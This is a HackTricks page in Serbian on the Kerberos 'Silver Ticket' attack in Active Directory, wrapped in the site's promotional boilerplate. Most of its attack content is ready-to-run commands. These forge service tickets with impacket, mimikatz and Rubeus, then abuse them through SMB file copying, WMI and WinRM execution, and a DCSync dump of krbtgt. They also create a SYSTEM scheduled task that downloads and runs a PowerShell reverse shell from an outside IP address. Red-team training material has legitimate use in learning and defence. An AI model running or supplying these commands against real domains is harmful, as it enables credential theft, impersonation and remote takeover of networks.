# Srebrna karta

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika, kako pisanog tako i govornog_).

{% embed url="https://www.stmcyber.com/careers" %}

## Srebrna karta

Napad **Srebrna karta** uključuje iskorišćavanje servisnih karata u Active Directory (AD) okruženjima. Ova metoda se oslanja na **dobijanje NTLM heša servisnog naloga**, kao što je nalog računara, kako bi se falsifikovala karta za Ticket Granting Service (TGS). Sa ovom falsifikovanom kartom, napadač može pristupiti određenim uslugama na mreži, **predstavljajući bilo kog korisnika**, obično ciljajući administrativne privilegije. Naglašava se da je korišćenje AES ključeva za falsifikovanje karata sigurnije i manje otkriveno.

Za izradu karata, koriste se različiti alati zasnovani na operativnom sistemu:

### Na Linux-u
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Na Windows operativnom sistemu
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS usluga je istaknuta kao čest cilj za pristupanje sistemima žrtve, ali i druge usluge poput HOST i RPCSS mogu biti iskorišćene za zadatke i WMI upite.

## Dostupne usluge

| Vrsta usluge                               | Srebrne ulaznice za usluge                                                |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell udaljeno upravljanje            | <p>HOST</p><p>HTTP</p><p>Zavisno od operativnog sistema:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Ponekad možete samo zatražiti: WINRM</p> |
| Zakazani zadaci                            | HOST                                                                       |
| Deljenje fajlova u Windows-u, takođe i psexec            | CIFS                                                                       |
| LDAP operacije, uključujući DCSync           | LDAP                                                                       |
| Alati za udaljeno upravljanje Windows Serverom | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Zlatne ulaznice                             | krbtgt                                                                     |

Koristeći **Rubeus** možete **zatražiti sve** ove ulaznice koristeći parametar:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Događaji ID-ja srebrnih ulaznica

* 4624: Prijava na nalog
* 4634: Odjava sa naloga
* 4672: Admin prijava

## Zloupotreba ulaznica za usluge

U sledećim primerima zamislimo da je ulaznica dobijena impersoniranjem administratorskog naloga.

### CIFS

Sa ovom ulaznicom možete pristupiti fasciklama `C$` i `ADMIN$` putem **SMB** (ako su izložene) i kopirati fajlove na udaljeni fajl sistem samo tako što ćete uraditi nešto poput:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Takođe ćete moći da dobijete shell unutar hosta ili izvršite proizvoljne komande koristeći **psexec**:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Sa ovlašćenjem možete generisati zakazane zadatke na udaljenim računarima i izvršiti proizvoljne komande:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Sa ovim karticama možete **izvršiti WMI na žrtvinskom sistemu**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pronađite **više informacija o wmiexec** na sledećoj stranici:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Sa pristupom winrm preko računara možete **pristupiti** čak i dobiti PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Proverite sledeću stranicu da biste saznali **druge načine povezivanja sa udaljenim hostom pomoću winrm-a**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Imajte na umu da **winrm mora biti aktivan i da osluškuje** na udaljenom računaru da biste mu pristupili.
{% endhint %}

### LDAP

Sa ovim privilegijama možete izvući bazu podataka DC-a koristeći **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saznajte više o DCSync** na sledećoj stranici:

## Reference
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika, pisano i govorno_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
